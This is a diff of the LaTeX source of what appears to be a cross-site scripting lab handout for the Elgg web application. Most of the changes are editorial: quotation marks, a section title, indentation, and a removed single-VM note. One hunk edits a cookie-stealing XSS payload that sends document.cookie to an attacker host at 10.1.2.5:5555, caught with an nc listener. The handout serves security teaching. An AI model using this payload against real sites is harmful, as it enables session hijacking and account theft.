@@ -75,7 +75,7 @@ Detailed coverage of the Cross-Site Scripting attack can be found in the followi
 \end{itemize}
 
 
-\paragraph{Lab environment.} \seedenvironmentB
+\paragraph{Lab environment.} \seedenvironmentB  \nodependency
 
 
 
@@ -249,7 +249,7 @@ attacker's machine (with IP address {\tt 10.1.2.5}), where the attacker has a TC
 listening to the same port.  
 
 \begin{lstlisting}
-<script>document.write('<img src=http://127.0.0.1:5555?c=' 
+<script>document.write('<img src=http://10.1.2.5:5555?c=' 
                        + escape(document.cookie) + '   >'); 
 </script> 
 \end{lstlisting}
@@ -268,14 +268,6 @@ $ nc -lnv 5555
 \noindent The "{\tt -l}" option is used to specify that nc should listen for an incoming
 connection rather than initiate a connection to a remote host. The "{\tt -nv}" option is used to
 have \texttt{nc} give more verbose output.
-
-
-The task can also be done with only one VM instead of two. For one VM, you should replace the
-attacker's IP address in the above script with {\tt 127.0.0.1}. Start a new terminal and then
-type the {\tt nc} command above.
-
-
-
 
 
 % -------------------------------------------
@@ -506,7 +498,7 @@ we have deactivated and commented out them to make the
 attack work. Actually, {\tt Elgg} uses two countermeasures. 
 One is a custom built security plugin {\tt HTMLawed}, 
 which, on activation, validates the user input and removes the tags from the input.
-This specific plugin is registered to the {\tt “function filter\_tags”} in the
+This specific plugin is registered to the {\tt "function filter\_tags"} in the
 \url{elgg/engine/lib/input.php} file. 
 
 
@@ -519,7 +511,7 @@ countermeasure.
 
 In addition to the {\tt HTMLawed 1.9} security plugin in {\tt Elgg}, there is another built-in
 PHP method called {\tt “htmlspecialchars()”}, which is used to encode the special characters in
-user input, such as {\tt "<"} to {\tt “\&lt”}, {\tt ">"} to {\tt “\&gt”}, etc.
+user input, such as {\tt "<"} to {\tt "\&lt"}, {\tt ">"} to {\tt “\&gt”}, etc.
 Please go to \url{/var/www/XSS/Elgg/vendor/elgg/elgg/views/default/output/} and
 find the function call {\tt “htmlspecialchars”} in {\tt text.php}, {\tt url.php}, {\tt
 dropdown.php} and {\tt email.php} files. Uncomment the corresponding {\tt "htmlspecialchars"}
@@ -604,10 +596,10 @@ changes to take effect:
 \end{lstlisting}
 
 
-\paragraph{Set up DNS.}
+\paragraph{DNS Setup.}
 We will access the above websites from our VM. 
 To access them through their respective URLs, 
-we need to add the following three entries to the 
+we need to add the following entries to the 
 \texttt{/etc/hosts} file, so these hostnames are mapped to 
 the IP address of the server container (\texttt{10.9.0.5}). 
 You need to use the root privilege to 
@@ -755,9 +747,9 @@ After starting the containers and making changes to the \texttt{/etc/hosts}, ple
 the following URLs from your VM. 
 
 \begin{lstlisting}
-  http://www.example32a.com
-  http://www.example32b.com
-  http://www.example32c.com
+http://www.example32a.com
+http://www.example32b.com
+http://www.example32c.com
 \end{lstlisting}
 
 \begin{enumerate}
